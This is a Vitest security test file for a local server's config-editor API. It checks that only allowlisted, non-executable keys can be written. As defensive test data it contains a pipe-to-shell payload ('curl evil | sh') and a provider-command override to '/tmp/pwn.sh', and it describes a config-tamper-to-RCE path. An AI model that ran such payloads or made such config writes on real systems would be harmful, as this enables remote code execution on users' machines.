import { afterEach, describe, expect, it } from "vitest";
import path from "node:path";
import os from "node:os";
import fs from "node:fs/promises";
import { execa } from "execa";
import { startServer, type StartedServer } from "../src/server/server.js";
import { applySetup } from "../src/setup/setup-service.js";
import type { ProviderDetectionRunner } from "../src/providers/provider-detection.js";

// Route-level checks for the schema-driven Config editor write surface
// (CLAUDE.md §3: dashboard/server APIs need route-level checks). The high-stakes
// property is the allowlist: only a schema-defined key may reach setConfigValue,
// which auto-creates intermediate YAML maps and would otherwise persist an
// arbitrary top-level key.

const noProvider: ProviderDetectionRunner = async () => ({ exitCode: 127, stdout: "", stderr: "" });

async function makeProject(): Promise<string> {
  const project = await fs.mkdtemp(path.join(os.tmpdir(), "vibestrate-configroute-"));
  await execa("git", ["init", "-q", "-b", "main"], { cwd: project });
  await execa("git", ["config", "user.email", "x@x"], { cwd: project });
  await execa("git", ["config", "user.name", "x"], { cwd: project });
  await fs.writeFile(path.join(project, "package.json"), '{"name":"demo"}');
  await execa("git", ["add", "."], { cwd: project });
  await execa("git", ["commit", "-q", "-m", "init"], { cwd: project });
  await applySetup({ options: { projectRoot: project }, detectionRunner: noProvider });
  return project;
}

let server: StartedServer | null = null;
afterEach(async () => {
  if (server) await server.close();
  server = null;
});

const json = { "content-type": "application/json" };

describe("config editor routes", () => {
  it("GET /api/config/fields lists settable leaves with current values + record flags", async () => {
    const project = await makeProject();
    server = await startServer({ projectRoot: project, port: 0, host: "127.0.0.1" });

    const res = await fetch(`${server.url}/api/config/fields`);
    expect(res.status).toBe(200);
    const body = (await res.json()) as {
      fields: { fullKey: string; type: string; isRecordContainer: boolean; current: unknown }[];
    };

    const byKey = new Map(body.fields.map((f) => [f.fullKey, f]));
    // A known boolean leaf with its default value surfaced.
    expect(byKey.get("git.requireCleanMain")?.current).toBe(false);
    // Record containers are flagged, not raw leaves.
    expect(byKey.get("providers")?.isRecordContainer).toBe(true);
  });

  it("POST /api/config/set writes a valid value and returns the persisted form", async () => {
    const project = await makeProject();
    server = await startServer({ projectRoot: project, port: 0, host: "127.0.0.1" });

    const res = await fetch(`${server.url}/api/config/set`, {
      method: "POST",
      headers: json,
      body: JSON.stringify({ key: "git.requireCleanMain", value: "true" }),
    });
    expect(res.status).toBe(200);
    const body = (await res.json()) as { value: unknown };
    expect(body.value).toBe(true);

    // Re-read via fields to confirm it persisted.
    const fields = (await (await fetch(`${server.url}/api/config/fields`)).json()) as {
      fields: { fullKey: string; current: unknown }[];
    };
    const f = fields.fields.find((x) => x.fullKey === "git.requireCleanMain");
    expect(f?.current).toBe(true);
  });

  it("SECURITY: rejects an unknown key with 400 and does not write it", async () => {
    const project = await makeProject();
    server = await startServer({ projectRoot: project, port: 0, host: "127.0.0.1" });

    const res = await fetch(`${server.url}/api/config/set`, {
      method: "POST",
      headers: json,
      body: JSON.stringify({ key: "totallyBogusKey", value: "x" }),
    });
    expect(res.status).toBe(400);

    // The bogus key must not appear in the on-disk config.
    const raw = await fs.readFile(
      path.join(project, ".vibestrate", "project.yml"),
      "utf8",
    );
    expect(raw).not.toContain("totallyBogusKey");
  });

  it("SECURITY: rejects a nested path under a non-record leaf with 400", async () => {
    const project = await makeProject();
    server = await startServer({ projectRoot: project, port: 0, host: "127.0.0.1" });

    // git.requireCleanMain is a boolean leaf; a child path under it is not settable.
    const res = await fetch(`${server.url}/api/config/set`, {
      method: "POST",
      headers: json,
      body: JSON.stringify({ key: "git.requireCleanMain.evil", value: "x" }),
    });
    expect(res.status).toBe(400);
  });

  it("returns 400 (not 500) when the value fails schema validation", async () => {
    const project = await makeProject();
    server = await startServer({ projectRoot: project, port: 0, host: "127.0.0.1" });

    // scheduler.maxConcurrentRuns must be an int >= 1; 0 is rejected by Zod.
    const res = await fetch(`${server.url}/api/config/set`, {
      method: "POST",
      headers: json,
      body: JSON.stringify({ key: "scheduler.maxConcurrentRuns", value: "0" }),
    });
    expect(res.status).toBe(400);
  });

  it("rejects an extra body key via .strict() (400)", async () => {
    const project = await makeProject();
    server = await startServer({ projectRoot: project, port: 0, host: "127.0.0.1" });
    const res = await fetch(`${server.url}/api/config/set`, {
      method: "POST",
      headers: json,
      body: JSON.stringify({ key: "git.requireCleanMain", value: "true", extra: 1 }),
    });
    expect(res.status).toBe(400);
  });

  it("SECURITY: rejects a path under a record container (no provider-command RCE) and does not write it", async () => {
    const project = await makeProject();
    server = await startServer({ projectRoot: project, port: 0, host: "127.0.0.1" });

    // The config-tamper -> host-RCE write half: repointing a provider's binary.
    // Record-container sub-keys are edited on the dedicated provider surface,
    // never through this generic endpoint.
    const res = await fetch(`${server.url}/api/config/set`, {
      method: "POST",
      headers: json,
      body: JSON.stringify({ key: "providers.claude.command", value: "/tmp/pwn.sh" }),
    });
    expect(res.status).toBe(400);
    const raw = await fs.readFile(
      path.join(project, ".vibestrate", "project.yml"),
      "utf8",
    );
    expect(raw).not.toContain("/tmp/pwn.sh");
  });

  it("SECURITY: rejects shell/executable-valued keys (commands.validate, editor.command) with 400", async () => {
    const project = await makeProject();
    server = await startServer({ projectRoot: project, port: 0, host: "127.0.0.1" });

    for (const key of ["commands.validate", "editor.command", "editor.args"]) {
      const res = await fetch(`${server.url}/api/config/set`, {
        method: "POST",
        headers: json,
        body: JSON.stringify({ key, value: '["curl evil | sh"]' }),
      });
      expect(res.status, key).toBe(400);
    }

    // ...and the fields endpoint flags them read-only so the UI never offers them.
    const fields = (await (await fetch(`${server.url}/api/config/fields`)).json()) as {
      fields: { fullKey: string; execGuarded: boolean }[];
    };
    expect(fields.fields.find((f) => f.fullKey === "commands.validate")?.execGuarded).toBe(true);
  });

  it("SECURITY: rejects an oversized value with 400 (size cap)", async () => {
    const project = await makeProject();
    server = await startServer({ projectRoot: project, port: 0, host: "127.0.0.1" });

    const res = await fetch(`${server.url}/api/config/set`, {
      method: "POST",
      headers: json,
      body: JSON.stringify({ key: "git.mainBranch", value: "x".repeat(20_000) }),
    });
    expect(res.status).toBe(400);
  });
});
